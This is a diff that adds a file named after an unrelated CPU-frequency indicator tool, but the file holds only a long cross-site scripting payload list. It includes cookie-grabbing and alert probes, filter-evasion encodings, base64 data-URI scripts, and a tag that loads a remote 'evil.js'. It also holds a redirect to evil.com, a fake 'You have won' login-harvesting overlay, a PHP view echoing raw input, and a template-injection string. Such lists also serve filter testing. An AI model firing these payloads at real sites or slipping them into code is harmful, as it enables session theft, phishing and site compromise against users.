@@ -1,0 +1,179 @@
+indicator-cpufreq
+
+
+
+
+
+<img src=1 onerror="s=document.createElement('script');s.src='//xss-doc.appspot.com/static/evil.js';document.body.appendChild(s);"
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<meta http-equiv="refresh" content="0;url=http://evil.com/" />
+<script>alert(location.href);</script>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search
+<script>alert("hellox worldss")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
+<script>alert("XSS");</script>&search=1
+<h1><font color=blue>hellox worldss</h1> للون
+<input onfocus=write(XSS) autofocus> للفراغ
+<input onblur=write(XSS) autofocus><input autofocus>
+<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<form><button formaction="javascript:alert(XSS)">lol
+<? foo="><script>alert(1)</script>">
+<div style="font-family:'foo&#10;;color:red;';">LOL
+LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
+<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(123)</script></svg>
+&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;
+exp/*<A STYLE='no\xss:noxss(\"*//*\");
+<A HREF=\"javascript:document.location='http://www.google.com/'\">XSS</A> والتشفيره جوه
+&lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+'';!--"<XSS>=&{()}
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<form id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION
+<!--<img src="--><img src=x onerror=alert(123)//">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="javascript:alert(1)">
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
+foo<script>alert(document.cookie)</script>
+<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
+</script><script >alert(document.cookie)</script>
+"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
+<video src=1 onerror=alert(1)>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<SCRIPT>alert(/XSS/.source)</SCRIPT>
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<TABLE id=XSS BACKGROUND="javascript:alert('XSS')">
+<IFRAME id=XSS SRC="javascript:alert('XSS');"></IFRAME>
+<BASE HREF="javascript:alert('XSS');//">
+<XML ID="XSS"><I><B>&lt;IMG id=XSS SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I><
+//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<STYLE>li {list-style-image: url("javascript:alert('XSS');</STYLE><UL><LI>XSS
+<style><!--</style><script>alert('XSS');//--></script>
+<!-- -- --><script>alert('XSS');</script><!-- -- -->
+<form id="test" /><button form="test" formaction="javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))">X
+<input id=XSS onfocus=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
+<select id=XSS onfocus=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
+<textarea id=XSS onfocus=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
+<keygen id=XSS onfocus=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
+<input id=XSS onblur=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus><input autofocus>
+<video id=XSS poster=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))//
+<body id=XSS onscroll=eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+'""><script language="JavaScript"> alert('X \nS \nS');</script>
+'></select><script>alert(XSS)</script>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+exp/*<XSS STYLE='no\xss:noxss("*//*");
+<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(123)</script></svg>
+<script>({0:#0=alert/#0#/#0#(0)})</script>
+</ foo="><script>alert(1)</script>">
+
+<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+
+<script>alert('XSSPOSED')</script>&cat_1=&cat_2=&sea rchGeoId=37&end_field=
+MSN-Search-APIlol"<script>alert(/XSSPOSE D/)</script>&o=102140&l=dir&jss=0
+<script>for((i)in(self))eval(i)(1)</script>
+?q=<body style=overflow:auto;height:1000px onscroll=alert(1337) id=x>#x
+"--></script><svg/onload=';alert(0);'>
+<svg><script>alert&#40;1&#41;</script>
+<svg/onload=%26%23097lert%26lpar;1337)>
+<svg id=alert(1337) onload=eval(id)>
+<svg id=javascript:alert(1337) onload=location=id>
+<svg/onload=alert&#40&#41> 
+"";</script><script>prompt(/XSSPOSED/)</script><"
+"><svg/onload=alert(/XSSPOSED/)>&qsrc=1
+"><img src="image.gif" onerror="alert(String.fromCharCode(88,83,83,80,79,83,69,68))">
+</a><img src=x onerror=alert(/XSSPOSED/)><!--
+brute"autofocus/logic/onfocus="alert('XSSPOSED')
+ali-->logic<svg/onload=alert('XSSPOSED')//
+'"/><hr><hr><script>alert(" XSSPOSED")</script><!--
+"/><script>alert("XSSPOSE D");</script>&f=85
+"><img src="-"onerror=alert('1337')>
+</script><svg/onload=alert(/XSSPOSED/)>logi c
+<video onerror=alert(1337) </poster>
+<input onfocus=alert(1337) </autofocus>
+<audio onloadstart=alert(1337) </src>
+<script>prompt('xss')</script>
+<xpm><script </xpm> alert(2) </script>
+<a onhelp='eval(href+"confirm(1)")'contenteditable='true'href='&#32;javascript:'>click</a> Press F1
+<script type="text/javascript"> //<![CDATA[ notification('Password sent to Injection Point', 'success'); //]]> </script>
+"><p id="\u0070rompt(1)"onmouseover=\u0065val(id)"></p>
+"><h2 id="Iamheading"onmouseover="confirm(1)">
+<script> var a = `foo\`; var b = `; confirm(1); //`; </script>
+<style> @\i\m\p\o\r\t '//xssplayground.net23.net/csstest.css';</style> 
+<input type='text' maxlength="15" value='InjectionPoint'>
+<body onhashchange=alert('1337')><a href=%23>click me!</a>
+'  - ->">'>' "<script>alert('xss')</script>
+<script>
+window.opener.location.replace('url')
+</script>
+ac6da<script>alert(1)</script>160283a2ff5
+<a href="javascript:alert('xss');">xss</a>
+78471<script>alert(document.domain)</script>e7fa9b7ec77
+<svg </onload ="1> (_=alert,_(1337)) "">
+<svg><script>0<1>alert('XSS')</script>
+"><svg><script>/<@/>alert(1337)</script>
+00cf4<script>alert(1)<%2fscript>84b744dff5a
+835f0<script>alert(1)<%2fscript>6e180aac38b
+2a790<script>alert(1)<%2fscript>234bbc58843
+</script><script>confirm(document.domain)</script>
+"><svg/onload=window.onerror=alert%3Bthrow/XSS/%3B//
+"><script>confirm(1)</script>
+'-confirm`1`-'
+/#<img src=1 onerror=javascript:alert('EXPLOITABLE!')>
+<image src=`` onerror=setTimeout/*("__")*/`\u0061lert\u00281\u0029/**/`>
+<a href="data:\@['{§(`__`)$}']@\, % 3 c script % 3 e alert(1) % 3 c/script %3 e">click</a>
+</**/div/**/style=/**/x&#x0003A;e/**/xpression(alert(1))>
+<style onload='execScript(/**/"\x61lert&#40 1&#41","j\x61vascript");'>
+<img src="a" onerror='eval(atob("cHJvbXB0KDEpOw=="))'
+<a target="_blank"
+href="data:text/html;BASE64youdummy,PHNjcmlwdD5hbGVydCh3aW5kb3cub3BlbmVyLmRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5pbm5lckhUTUwpPC9zY3JpcHQ+">clickme
+in firefox</a>
+<a/''' target="_blank"
+href=data:text/html;;base64,PHNjcmlwdD5hbGVydChvcGVuZXIuZG9jdW1lbnQuYm9keS5pbm5lckhUTUwpPC9zY3JpcHQ+>firefox11</a>
+<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
+ 
+class Xssdemo extends CI_Controller {
+ 
+        public function index() {
+            $data['xss'] = $this->security->xss_clean($this->input->post('xss'));
+            $this->load->view('xssdemo', $data);
+        }
+}
+ 
+// application/views/xssdemo.php
+<form method=post>
+                <textarea name=xss><?php echo htmlspecialchars($xss); ?></textarea>
+                <input type=submit />
+                </form>
+        <p>XSS:
+        <hr />
+    <?php echo $xss ?>
+<s <onmouseover="alert(1)"> <s onmouseover="alert(1)">This is a test</s>
+
+["<s ", " onmouseover='alert(1)'>", "foobar</s>"]
+
+<div style="z-index: 9999999; background-color: green; width: 100%; height: 100%">
+<h1>You have won</h1>Please click the link and enter your login details:
+<a href="http://example.com/">http://good.com</a>
+</div>
+
+
+?id=<script>//&id=';%0a'&id='%0aalert/*&id=*/(1)//&id=</script>
+'-confirm(1)-'
+'-alert(document.domain)-'
+
+wrtz{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}zzzz
+
+
+
+
+
+
+
+
